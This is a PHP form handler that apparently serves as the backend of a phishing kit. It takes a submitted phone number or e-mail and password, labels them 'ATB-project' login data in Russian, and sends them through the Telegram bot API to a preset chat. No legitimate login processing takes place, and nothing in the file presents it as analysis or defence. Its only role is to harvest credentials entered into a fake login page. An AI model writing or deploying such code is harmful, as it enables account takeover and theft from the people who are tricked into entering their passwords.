<?php
 

 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
  
  if (!empty($_POST['phoneNmail']) && !empty($_POST['pass'])) {
     
    $txt = "ATB-project%0AДанные для входа%0A%0A";
     
    if (isset($_POST['phoneNmail']) && !empty($_POST['phoneNmail'])) {
      $txt .= "Телефон/E-mail:" . strip_tags(urlencode($_POST['phoneNmail'])) . "%0A";
    }

    if (isset($_POST['pass']) && !empty($_POST['pass'])) {
      $txt .= "Пароль:" . strip_tags(urlencode($_POST['pass'])) . "%0A";
    }
 
    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  } else {
    echo json_encode('NOTVALID');
  }
} else {
  header("Location: /");
}